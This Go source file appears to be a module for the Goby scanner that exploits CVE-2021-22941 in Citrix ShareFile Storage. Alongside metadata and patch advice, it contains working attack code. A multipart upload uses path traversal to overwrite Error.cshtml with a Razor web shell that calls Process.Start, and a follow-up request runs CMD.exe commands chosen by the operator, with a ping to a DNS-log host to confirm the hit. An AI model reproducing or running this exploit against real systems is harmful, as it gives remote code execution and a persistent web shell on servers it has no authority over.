package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Citrix ShareFile Storage RCE (CVE-2021-22941)",
    "Description": "<p>Citrix Systems Citrix ShareFile is a file sharing system of the American Citrix Systems company.</p><p>Citrix ShareFile Storage has security vulnerabilities. Attackers can overwrite the original files and execute arbitrary commands to control server permissions.</p>",
    "Impact": "Citrix ShareFile Storage RCE (CVE-2021-22941)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://support.citrix.com/article/CTX328123\">https://support.citrix.com/article/CTX328123</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Citrix ShareFile Storage",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Citrix ShareFile Storage 文件共享系统任意代码执行（CVE-2021-22941）",
            "Description": "<p>Citrix Systems Citrix ShareFile是美国思杰系统（Citrix Systems）公司的一套文件共享系统。</p><p>Citrix ShareFile Storage存在安全漏洞。攻击者可覆盖原有文件执行任意命令，控制服务器权限。</p>",
            "Impact": "<p>Citrix ShareFile Storage存在安全漏洞。攻击者可覆盖原有文件执行任意命令，控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://support.citrix.com/article/CTX328123\">https://support.citrix.com/article/CTX328123</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Citrix ShareFile Storage",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Citrix ShareFile Storage RCE (CVE-2021-22941)",
            "Description": "<p>Citrix Systems Citrix ShareFile is a file sharing system of the American Citrix Systems company.</p><p>Citrix ShareFile Storage has security vulnerabilities. Attackers can overwrite the original files and execute arbitrary commands to control server permissions.</p>",
            "Impact": "Citrix ShareFile Storage RCE (CVE-2021-22941)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://support.citrix.com/article/CTX328123\">https://support.citrix.com/article/CTX328123</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Citrix ShareFile Storage",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "body=\"ShareFile Storage Server\"",
    "GobyQuery": "body=\"ShareFile Storage Server\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.citrix.com",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-22941"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202109-1001"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "ping xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Citrix ShareFile Storage"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10244"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl1, _ := godclient.GetGodCheckURL(checkStr)
			cmd := "ping%20-n%205%20" + checkUrl1
			uri := `/upload.aspx?uploadid=%40using+System.Diagnostics%3B%40%7Bint+idx0%3D+0%3Bstring+str_idx0+%3D+idx0.ToString%28%29%3B+int+idx1+%3D+1%3Bstring+str_idx1+%3D+idx1.ToString%28%29%3Bstring+cmd+%3D+Request.QueryString%5Bstr_idx0%5D%3Bstring+arg+%3D+Request.QueryString%5Bstr_idx1%5D%3BProcess.Start%28cmd%2Carg%29%3B%7D%2F..%2F..%2FConfigService%5CViews%5CShared%5CError.cshtml&bp=123&accountid=123`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=boundary")
			cfg.Data = "--boundary\r\nContent-Disposition: form-data; name=\"text4\"; filename=\"text5\"\r\n\r\nIJ1ZLDHIOWEN9LNYTMAWTC0GMGACAEK74177ZVSCHG71I892HS59HG1AJNBCHR1FJXCA3UJ5M24ZMBMOZWRATE887W58E0KYR1RY92K4SEHMTZKPY237ROUHMF1OF1K34NNZHVYUVBSWHQSX266G2DPXR3IO9XAH7VGKSUX8FMVSEZG65U6HPUXCQ8WJ5TBQ2LZZMKS6BHJ9J16Y9MYSODSFX0SZ182YGFZ7E5O6CT0NRD61DRJCF9B59JEVVDHAZ09GVAL2SDA9U6F2LWJSAGE5JLIPE30ZI4YPM1FNFY9J77QHPJ6YCC4WVMJ3ZW51HK58M2PX0CP0JM7I62KMB7FBQDCY9M6FFOB4HPYPFDIN2RJXSX44IA8USIAGFQ8W12X5YWUGQSRKBG2YDNEF6KNLLJYUNGFL7IRHY0DNTFOMEB4HV5VZ0TZS4X1SB1ARU9P93EK9N8GXD23OS1XPLZ2Q6LNO3EM8MVEUF03H3AAK4U8J2BFWW6I5I3HWPF6WLO4HI67Y2982CGLCK7RPJ5P6CNJ0UZ0NRRN9QBEMK0ZR31IVVUQLWKDVGZ77K6YH9ICEL6KN40HD5OE7M708RSNKSHTYHW5J05VK9F0U7V0KGSPF166GG1GE7324M06T25ICOTLDZS57SW048U93UVHMZ6WFOWDWTV3G2HGPQ1EVBHDC8B00I81OD95Q79GVY5HPREAW2WOU3XRY3X133IGB46KZA6Z2YRZK378S7PUC38W1EFE9UPXYOQM4YVM4NTZDHLZV9DS3CKODK8TRR1ILGY7XWYQ3YZXR13PEAUSJ9NF82EQS2RIFWTCCEBNUOFHHPX54JVAQCWUV42QWHM5N1141Q7ODCG5JQC062NBHDVS61QZE22SSAOMTTFJ5WGFIMJAUCDCJ7Y9X9RCUEAJYPZX4V2BGI97N0AF1GYSSXUZ70YCY24S7OR0QHJ0KAYM3IF4YSYIO38CAEZWRVRS8E6CRZDCUINN9A48IJPMXA4TMDJ9P5B8XO0P4H493V4TE6UZLKAKX0K9ENX3AMPZOECYQ4P1UZ2HZ9FTSX99TXZGSO6F36GBOR5N79JWQ9SJ8ZEB4KLZV272SFUKQI1JAL3DWGXHT5IWIT2LWPICE4L4WFA5UMY9PKLLKEZSB1YTD8XSQ8TMRPBMOTMKWTPUPTPK4ZX35HNSRX41IQ5HXPQM8RCBC45VY15X7S6HFEIU4HQBIME5AW55L6BZFS2ADMB4CP5L8LCZPT5E9VUQLFKQ89VUPHDFRCKLAUOJNXEW68RUYPVP34HAQZLC3JHPL7FKL2X0X6KI59KDCF66UR80EIH3JIARUHZ3RIQUEBWBZGNE09SWHMAOKMEXW5FSZ14UFVDS1VQZJNMCJM9EJDR6SBLVOCMAUPO1NG2OKO87YDSDU4CGZW06NV1Z3K85UXSP0664O87D7PMD4ZFHANAQ2KP1O6I8H2D1VB42VY8KGH8934B5NXWSK47IN2HYMSTRBHIEBVFBGJCLH7PW95GMC3X5WTBTFPRMXT1EKYYZTNMJ7A1S06DG9LINUYY8MCKCCPLSJG3JFTLXNC8D7IUSVC8H66D7S49CDLUT5VGG0A97D8488NWQUHWUUP6VJYVJF2CYOFX0GFTE1CE8MS7Q3QODD70KK3IRIVWGBP4UUYKWTHRRRZS55620WYOWI2RAC8JCN4EJOKG9XL753PMLWY9F2XWVLYI86XI4XU1WSDYR98FXJZ4AKGLWVEMN912UNLXM95VGZHAH2IYKJEQSRSUJ5WFEZ9ASF7SWPTU1QA3Q1ONOMXEHNPMTCVAHO0IHTHHCQTBTA8ZCTVLAFG4YCO6BJQBAIVFOI9AUDNQXCTFRIL9SB9ZD5WNNNN4ZU4KT8VQONN1T0JL2JFQO1OO95D0ZVSCBBT4NPULAP0LVWXJ4SH42YZWQP56XQY0VRYJLTL1PV4Q2VUDI30MB3BQO5KK1C00UR8IXLTW6KHEU454RKI50QNTR16V40D5FM2H4CMNSNPZMI98R8E03L8IAD16W3E5UU67HR39XEFSF4FV9Y60RINQ1FA3PAJYIJYWMQ3X73X72E4IZB8NLT2B0GBFNXXT7KOEPC3019XIG8799TF3APNPN3CHC60DWJXDV0HHFCTACWWEIXXB1TC6PGASQQ6O4Q0TSC3V2F5ABUO6NLNRIZ7C5FM5ADZQU87XTY3TC30MEWMUFDAXI2DEDVQW5RRIKEG7Q645VSVRVEWE8CS0ZMC9CGKA6AVX7G65VYVIDU48JUPF8KJLPWUIJQ84IK5JSIR2YFUHQCHKBK2WJOQBUARBLZH83H9BVPFA9ABA3IW36QAAHDGKA9LST156KZ8EIVL6T4AT9H2SZ0F0JUXY9QGO1SNK7UE73PX39J3M7S32F4TFQDKMTUNAY8L1G4S2D5MLVRXIK4ACIYYKRUQAQIZOR7ARR7SX6PVNUDQJ40684QC9WU64ZQN98U5KW2ZCZOUK3W6076X4RW1LCTBQ8U0ZGUP5DVXKG7E5NUVA4J5LJJBHFUUTZTC1WLJTIOZ2968EV3HPN4EQKD76JLVUAA017Z3QGKR5WD8HHN06GCF0G226W8ZEBWUUDR1G1HRGHYQ1B3TH8DLJS9OK0JWKS867XX8APETVPHREAJEEVFXSO7SQ4H01QVE3PZR30R58VC2AU3IMH6NHUKAM67BVHKWV0AHCP9SL1H7RHI65I5JX9MIG9JNJROAZZYNCXLIYXW5DMJ7GYUIAQW7E4NV0IGM1EBPSIPIDP6APWJJAHPSA12XN3HRET35CZZ880UQ28QMASCV0E23EMJQMAEPJ38NB8GAKXWEG4PFANP3ASV0N5QAN5L1A0YDGL2H4Z5SOCLDNV5RZI94DW14GQS4AETKW7S31N061YFMQ72YQYLEH2O3M6L51JN2T6GOQQH0R848WUQOH321A7QFQF60B7K6RJBD7VZ5EUSDHWLJRN1HK1AEIZNJLNDUKO238452YEOHENAKL3WHI72Y3ZDCWA6BUT0SJ80R3NKC4XFXVHG9ZZM6S3QD7IYB9OVFRN242GWSPFFEQNZUY08XBREJ7LGVCBC8NFJ5TOA0NCP9RGGQCIVZGXRDF40COH3IVBHC5JMKM3M1ZU0WC6V6RQG0L2S1SC98VALDGQHKDF69YY8OJFQ25I5VV71MPWME7CQ6T594369TBQOYHJ1NT1AUP4MEIRGDQO1BTJOXSO5GDGXASFUZ1SHPMSMP6HO7JLQBKPTOWMHRIQD44942Y5MFU0WCPO9B2RIEWBPC2YP0832137JAHYL1V10CT8YFKNPVSY5MV3ZVR7QK7RUV9SAJ13ITG9I6YC77LY5BZUSXML2E64OVCKNDGB44XLPJO9UXIKAVCCZ646CE7AIWC6EQZ3TO70IG5IIS61MW0CLOAXDT0Y60T82O17TWTV09OK59HGALLBZIS8WV1EDJTUDYYXXGD7UVS3YI8RFLDRV849U9SSKYS2I5I9TV3QBEQHJX2E1UEPOC4HGR8BMK05BZNCTVD8NHT433Y8Q73LI7ULPGSKQ28MNLN2TD3FVDZGAWS7JG0VZGRCTSIUCBMEFO8E9AQDLB8PMU19M6SY0K5UCHOC3MMRV9WG1YZPVRNR27C6RFNSX9Y4KDAE9QH63QE7TVO1M1LB3C6W3P0PC1SA82B5LSBVEUT2AMB0KI196D48EQ79F5UJDG5ZGDFMPMFWAZ38H5IN64W9O9S9BU0ES050VU4VBHSD860IHRV33DKDILQ2OZH37KK401K1XT1D8BIBY4BYTQE5MPFTMC2GQQCJKEWKVWVI6NTGKOU2RFH0ZCQE5VDT5YPG10W1U2RBT51JZX1D1LUXYDIBL4SBCXJNUYDFHIP73FGOHK8JX74KKWFB95AGUEHNE55UM7B6PC22QMMUUO9Z6C9GH8FPACU4ZNDSYOQPB6JYNJDXTL22BRXHVS790DGFPMFLTJLU03JL1SY8CJEBKQORWGALCMPDU88IBXR913I00FAPDVK4Z8ASM2EWKUYWK8QBKIRHY7DQB2SRR8TDJN747ANB8ZU1JF4H45WIYAHFU9GNMQ55XCLLP5994\r\n--boundary--"
			httpclient.DoHttpRequest(u, cfg)
			uri2 := "/configservice/Home/Error?0=CMD.exe&1=/C%20" + cmd
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 {
				return godclient.PullExists(checkStr, time.Second*15)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			dnslog := ss.Params["dnslog"].(string)
			cmd := strings.ReplaceAll(dnslog, " ", "%20")
			uri := `/upload.aspx?uploadid=%40using+System.Diagnostics%3B%40%7Bint+idx0%3D+0%3Bstring+str_idx0+%3D+idx0.ToString%28%29%3B+int+idx1+%3D+1%3Bstring+str_idx1+%3D+idx1.ToString%28%29%3Bstring+cmd+%3D+Request.QueryString%5Bstr_idx0%5D%3Bstring+arg+%3D+Request.QueryString%5Bstr_idx1%5D%3BProcess.Start%28cmd%2Carg%29%3B%7D%2F..%2F..%2FConfigService%5CViews%5CShared%5CError.cshtml&bp=123&accountid=123`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=boundary")
			cfg.Data = "--boundary\r\nContent-Disposition: form-data; name=\"text4\"; filename=\"text5\"\r\n\r\nIJ1ZLDHIOWEN9LNYTMAWTC0GMGACAEK74177ZVSCHG71I892HS59HG1AJNBCHR1FJXCA3UJ5M24ZMBMOZWRATE887W58E0KYR1RY92K4SEHMTZKPY237ROUHMF1OF1K34NNZHVYUVBSWHQSX266G2DPXR3IO9XAH7VGKSUX8FMVSEZG65U6HPUXCQ8WJ5TBQ2LZZMKS6BHJ9J16Y9MYSODSFX0SZ182YGFZ7E5O6CT0NRD61DRJCF9B59JEVVDHAZ09GVAL2SDA9U6F2LWJSAGE5JLIPE30ZI4YPM1FNFY9J77QHPJ6YCC4WVMJ3ZW51HK58M2PX0CP0JM7I62KMB7FBQDCY9M6FFOB4HPYPFDIN2RJXSX44IA8USIAGFQ8W12X5YWUGQSRKBG2YDNEF6KNLLJYUNGFL7IRHY0DNTFOMEB4HV5VZ0TZS4X1SB1ARU9P93EK9N8GXD23OS1XPLZ2Q6LNO3EM8MVEUF03H3AAK4U8J2BFWW6I5I3HWPF6WLO4HI67Y2982CGLCK7RPJ5P6CNJ0UZ0NRRN9QBEMK0ZR31IVVUQLWKDVGZ77K6YH9ICEL6KN40HD5OE7M708RSNKSHTYHW5J05VK9F0U7V0KGSPF166GG1GE7324M06T25ICOTLDZS57SW048U93UVHMZ6WFOWDWTV3G2HGPQ1EVBHDC8B00I81OD95Q79GVY5HPREAW2WOU3XRY3X133IGB46KZA6Z2YRZK378S7PUC38W1EFE9UPXYOQM4YVM4NTZDHLZV9DS3CKODK8TRR1ILGY7XWYQ3YZXR13PEAUSJ9NF82EQS2RIFWTCCEBNUOFHHPX54JVAQCWUV42QWHM5N1141Q7ODCG5JQC062NBHDVS61QZE22SSAOMTTFJ5WGFIMJAUCDCJ7Y9X9RCUEAJYPZX4V2BGI97N0AF1GYSSXUZ70YCY24S7OR0QHJ0KAYM3IF4YSYIO38CAEZWRVRS8E6CRZDCUINN9A48IJPMXA4TMDJ9P5B8XO0P4H493V4TE6UZLKAKX0K9ENX3AMPZOECYQ4P1UZ2HZ9FTSX99TXZGSO6F36GBOR5N79JWQ9SJ8ZEB4KLZV272SFUKQI1JAL3DWGXHT5IWIT2LWPICE4L4WFA5UMY9PKLLKEZSB1YTD8XSQ8TMRPBMOTMKWTPUPTPK4ZX35HNSRX41IQ5HXPQM8RCBC45VY15X7S6HFEIU4HQBIME5AW55L6BZFS2ADMB4CP5L8LCZPT5E9VUQLFKQ89VUPHDFRCKLAUOJNXEW68RUYPVP34HAQZLC3JHPL7FKL2X0X6KI59KDCF66UR80EIH3JIARUHZ3RIQUEBWBZGNE09SWHMAOKMEXW5FSZ14UFVDS1VQZJNMCJM9EJDR6SBLVOCMAUPO1NG2OKO87YDSDU4CGZW06NV1Z3K85UXSP0664O87D7PMD4ZFHANAQ2KP1O6I8H2D1VB42VY8KGH8934B5NXWSK47IN2HYMSTRBHIEBVFBGJCLH7PW95GMC3X5WTBTFPRMXT1EKYYZTNMJ7A1S06DG9LINUYY8MCKCCPLSJG3JFTLXNC8D7IUSVC8H66D7S49CDLUT5VGG0A97D8488NWQUHWUUP6VJYVJF2CYOFX0GFTE1CE8MS7Q3QODD70KK3IRIVWGBP4UUYKWTHRRRZS55620WYOWI2RAC8JCN4EJOKG9XL753PMLWY9F2XWVLYI86XI4XU1WSDYR98FXJZ4AKGLWVEMN912UNLXM95VGZHAH2IYKJEQSRSUJ5WFEZ9ASF7SWPTU1QA3Q1ONOMXEHNPMTCVAHO0IHTHHCQTBTA8ZCTVLAFG4YCO6BJQBAIVFOI9AUDNQXCTFRIL9SB9ZD5WNNNN4ZU4KT8VQONN1T0JL2JFQO1OO95D0ZVSCBBT4NPULAP0LVWXJ4SH42YZWQP56XQY0VRYJLTL1PV4Q2VUDI30MB3BQO5KK1C00UR8IXLTW6KHEU454RKI50QNTR16V40D5FM2H4CMNSNPZMI98R8E03L8IAD16W3E5UU67HR39XEFSF4FV9Y60RINQ1FA3PAJYIJYWMQ3X73X72E4IZB8NLT2B0GBFNXXT7KOEPC3019XIG8799TF3APNPN3CHC60DWJXDV0HHFCTACWWEIXXB1TC6PGASQQ6O4Q0TSC3V2F5ABUO6NLNRIZ7C5FM5ADZQU87XTY3TC30MEWMUFDAXI2DEDVQW5RRIKEG7Q645VSVRVEWE8CS0ZMC9CGKA6AVX7G65VYVIDU48JUPF8KJLPWUIJQ84IK5JSIR2YFUHQCHKBK2WJOQBUARBLZH83H9BVPFA9ABA3IW36QAAHDGKA9LST156KZ8EIVL6T4AT9H2SZ0F0JUXY9QGO1SNK7UE73PX39J3M7S32F4TFQDKMTUNAY8L1G4S2D5MLVRXIK4ACIYYKRUQAQIZOR7ARR7SX6PVNUDQJ40684QC9WU64ZQN98U5KW2ZCZOUK3W6076X4RW1LCTBQ8U0ZGUP5DVXKG7E5NUVA4J5LJJBHFUUTZTC1WLJTIOZ2968EV3HPN4EQKD76JLVUAA017Z3QGKR5WD8HHN06GCF0G226W8ZEBWUUDR1G1HRGHYQ1B3TH8DLJS9OK0JWKS867XX8APETVPHREAJEEVFXSO7SQ4H01QVE3PZR30R58VC2AU3IMH6NHUKAM67BVHKWV0AHCP9SL1H7RHI65I5JX9MIG9JNJROAZZYNCXLIYXW5DMJ7GYUIAQW7E4NV0IGM1EBPSIPIDP6APWJJAHPSA12XN3HRET35CZZ880UQ28QMASCV0E23EMJQMAEPJ38NB8GAKXWEG4PFANP3ASV0N5QAN5L1A0YDGL2H4Z5SOCLDNV5RZI94DW14GQS4AETKW7S31N061YFMQ72YQYLEH2O3M6L51JN2T6GOQQH0R848WUQOH321A7QFQF60B7K6RJBD7VZ5EUSDHWLJRN1HK1AEIZNJLNDUKO238452YEOHENAKL3WHI72Y3ZDCWA6BUT0SJ80R3NKC4XFXVHG9ZZM6S3QD7IYB9OVFRN242GWSPFFEQNZUY08XBREJ7LGVCBC8NFJ5TOA0NCP9RGGQCIVZGXRDF40COH3IVBHC5JMKM3M1ZU0WC6V6RQG0L2S1SC98VALDGQHKDF69YY8OJFQ25I5VV71MPWME7CQ6T594369TBQOYHJ1NT1AUP4MEIRGDQO1BTJOXSO5GDGXASFUZ1SHPMSMP6HO7JLQBKPTOWMHRIQD44942Y5MFU0WCPO9B2RIEWBPC2YP0832137JAHYL1V10CT8YFKNPVSY5MV3ZVR7QK7RUV9SAJ13ITG9I6YC77LY5BZUSXML2E64OVCKNDGB44XLPJO9UXIKAVCCZ646CE7AIWC6EQZ3TO70IG5IIS61MW0CLOAXDT0Y60T82O17TWTV09OK59HGALLBZIS8WV1EDJTUDYYXXGD7UVS3YI8RFLDRV849U9SSKYS2I5I9TV3QBEQHJX2E1UEPOC4HGR8BMK05BZNCTVD8NHT433Y8Q73LI7ULPGSKQ28MNLN2TD3FVDZGAWS7JG0VZGRCTSIUCBMEFO8E9AQDLB8PMU19M6SY0K5UCHOC3MMRV9WG1YZPVRNR27C6RFNSX9Y4KDAE9QH63QE7TVO1M1LB3C6W3P0PC1SA82B5LSBVEUT2AMB0KI196D48EQ79F5UJDG5ZGDFMPMFWAZ38H5IN64W9O9S9BU0ES050VU4VBHSD860IHRV33DKDILQ2OZH37KK401K1XT1D8BIBY4BYTQE5MPFTMC2GQQCJKEWKVWVI6NTGKOU2RFH0ZCQE5VDT5YPG10W1U2RBT51JZX1D1LUXYDIBL4SBCXJNUYDFHIP73FGOHK8JX74KKWFB95AGUEHNE55UM7B6PC22QMMUUO9Z6C9GH8FPACU4ZNDSYOQPB6JYNJDXTL22BRXHVS790DGFPMFLTJLU03JL1SY8CJEBKQORWGALCMPDU88IBXR913I00FAPDVK4Z8ASM2EWKUYWK8QBKIRHY7DQB2SRR8TDJN747ANB8ZU1JF4H45WIYAHFU9GNMQ55XCLLP5994\r\n--boundary--"
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			uri2 := "/configservice/Home/Error?0=CMD.exe&1=/C%20" + cmd
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
				expResult.Output = "it is a blind rce" + resp2.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}
